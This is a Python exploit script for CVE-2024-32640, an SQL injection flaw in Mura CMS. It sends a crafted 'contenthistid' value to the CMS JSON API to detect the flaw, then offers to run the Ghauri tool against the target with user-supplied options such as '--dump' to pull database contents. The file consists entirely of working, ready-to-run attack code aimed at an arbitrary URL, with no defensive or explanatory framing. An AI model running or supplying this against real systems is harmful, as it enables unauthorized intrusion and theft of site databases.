import requests
import argparse
import urllib3
import subprocess
from urllib.parse import urlparse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import shutil

#ANSI
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
PURPLE = '\033[95m'
RESET = '\033[0m'

def banner():

    print(f"""


   ▄▄▄▄███▄▄▄▄   ███    █▄     ▄████████    ▄████████  ▄█  ████████▄     ▄████████    ▄████████ 
 ▄██▀▀▀███▀▀▀██▄ ███    ███   ███    ███   ███    ███ ███  ███   ▀███   ███    ███   ███    ███ 
 ███   ███   ███ ███    ███   ███    ███   ███    ███ ███▌ ███    ███   ███    █▀    ███    ███ 
 ███   ███   ███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ ███▌ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
 ███   ███   ███ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ ███▌ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
 ███   ███   ███ ███    ███ ▀███████████   ███    ███ ███  ███    ███   ███    █▄  ▀███████████ 
 ███   ███   ███ ███    ███   ███    ███   ███    ███ ███  ███   ▄███   ███    ███   ███    ███ 
  ▀█   ███   █▀  ████████▀    ███    ███   ███    █▀  █▀   ████████▀    ██████████   ███    ███ 
                              ███    ███                                             ███    ███ 

              {YELLOW}CVE-2024-32640.py - SQL Injection in Mura CMS
        {GREEN}Usage: python3 CVE-2024-32640.py --url https://example.com/
                       {PURPLE}Developer: @stuub{RESET}

          """)

def isAlive(url):
    try:
        r = requests.get(url, verify=False)
        if r.status_code == 200:
            return True
        else:
            print(f"{RED}[-]{RESET} Target is not alive")
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def Injection(url, endpoint):
    SQL_ERROR_MESSAGE = "You have an error in your SQL syntax"    
    host = urlparse(url).netloc
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": host,
    }
    data = {
    "object": "displayregion",
    "contenthistid": "x%5c",
    "previewid": "1"
}
    print(f"{YELLOW}[!]{RESET} Checking for SQL Injection")
    url = f"{url}{endpoint}"
    r = requests.post(url, headers=headers, verify=False, data=data)

    if SQL_ERROR_MESSAGE in r.text or r.status_code == 500:
        print(f"{GREEN}[+]{RESET} Target is vulnerable to SQL Injection.\n")
        print(f"{YELLOW}[!] For exploitation, use Ghauri:")
        print(f"{GREEN}[+]{RESET} https://github.com/r0oth3x49/ghauri")  
    else:
        print(f"{RED}[-]{RESET} Target is not vulnerable")
        exit(1)

def Ghauri(url, sqli, endpoint):
    print("\n")
    print(f"{YELLOW}[!]{RESET} Checking existance of Ghauri")
    if shutil.which("ghauri") is None:
        print("{RED}[-]{RESET} Ghauri not installed or found in $PATH")
        exit(1)
    else: 
        print(f"{GREEN}[+]{RESET} Ghauri located!")
        command = ["ghauri", "-u", url+endpoint, "-p", "contenthistid"]
        if sqli:
            command.extend(sqli)
        else:
            sqli = ""
        print(f"{GREEN}[*]{RESET} Starting Ghauri")
        print (f'{GREEN}[*]{RESET} Payload: ghauri -u "{url}{endpoint}" -p contenthistid',sqli)
        subprocess.run(command)

def main():
    parser = argparse.ArgumentParser(description="CVE-2024-32640.py - SQL Injection in Mura CMS")
    parser.add_argument('-u', '--url', required=True, help="URL of the target")
    parser.add_argument('-g', '--ghauri', nargs=argparse.REMAINDER, help="Parameters for Ghauri. Example: -g '--dump --threads 10'")
    args = parser.parse_args()
    url = args.url
    sqli = args.ghauri
    parsedUrl = urlparse(url)
    strippedUrl = f"{parsedUrl.scheme}://{parsedUrl.netloc}"
    url = strippedUrl
    endpoint = "/_api/json/v1/default/?method=processAsyncObject&object=displayregion&contenthistid=x%5c&previewID=x"

    if isAlive(url):
        Injection(url, endpoint)
        i = input("Do you want to exploit with Ghauri? (Y/N)")
        if i.lower() == "y": 
            Ghauri(url, sqli, endpoint)
        else:
            return

if __name__ == "__main__":
    banner()
    main()